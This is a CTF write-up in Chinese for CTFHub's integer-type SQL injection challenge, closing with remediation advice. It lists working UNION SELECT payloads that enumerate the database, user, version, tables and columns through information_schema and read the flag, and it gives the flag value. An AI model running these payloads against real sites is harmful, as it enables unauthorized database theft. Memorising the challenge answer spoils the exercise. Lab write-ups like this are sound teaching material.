CTFHub - Web - SQL注入 - 整数型注入

# CTFHub # Web # SQL注入 # 整数型 # Union注入

一、题目信息

  • 题目名称：整数型注入
  • 题目方向：Web - SQL注入
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目目标：通过注入点读取数据库中的 flag。

二、判断注入类型

访问首页后，页面提供 id 查询参数。提交 id=1，服务端直接把执行过的 SQL 语句和查询结果回显到页面中：

select * from news where id=1

ID: 1
Data: ctfhub

参数没有使用单引号包裹，说明这是一个整数型注入点。继续分别提交真条件和假条件：

select * from news where id=1 and 1=1
# 返回 ID: 1

select * from news where id=1 and 1=2
# 没有返回数据

条件为真时正常返回，条件为假时无结果，可以确认 id 参数存在 SQL 注入。

三、确定查询列数

原查询使用 select *，需要通过 union select 判断结果集列数。先使用两列：

0 union select 1,2#

页面返回 ID: 1 和 Data: 2，而三列 payload 没有结果，因此原查询共有两列，两个列都可以作为回显位置。

四、获取数据库信息

将数据库名和当前用户放入两个回显位置：

0 union select database(),user()#

返回结果：

ID: sqli
Data: root@localhost

继续读取数据库版本和系统信息：

0 union select version(),@@version_compile_os#
ID: 10.3.22-MariaDB-0+deb10u1
Data: debian-linux-gnu

五、枚举表和字段

通过 information_schema.tables 查询当前数据库中的表：

0 union select group_concat(table_name),3
from information_schema.tables
where table_schema=database()#

结果中存在：

flag,news

继续查询 flag 表的字段。这里使用十六进制字符串 0x666c6167 表示 flag，可以避免引号规则带来的干扰：

0 union select group_concat(column_name),3
from information_schema.columns
where table_schema=database()
and table_name=0x666c6167#

得到字段名：

flag

六、读取 Flag

将 flag 字段放入第一个回显位置：

0 union select flag,3 from flag#

服务端返回：

select * from news where id=0 union select flag,3 from flag#
ID: ctfhub{f87b908177ebf13459ac49b1}
Data: 3

对应的 URL 编码 payload 为：

/?id=0%20union%20select%20flag,3%20from%20flag%23

七、最终 Flag

ctfhub{f87b908177ebf13459ac49b1}

八、修复建议

  • 使用预处理语句和参数绑定，禁止将用户输入直接拼接进 SQL 语句。
  • 对 id 等参数执行严格的数据类型校验，只允许合法的整数输入。
  • 数据库账号遵循最小权限原则，Web 应用不应使用 root 账号连接数据库。
  • 关闭生产环境中的 SQL 语句和详细错误回显，避免泄露数据库结构。

九、解题总结

本题没有复杂的过滤规则，关键是利用页面回显的完整 SQL 语句快速判断整数型注入点，再通过 union select 获取列数、数据库结构并读取 flag。实际开发中应使用参数化查询从根本上消除此类漏洞。
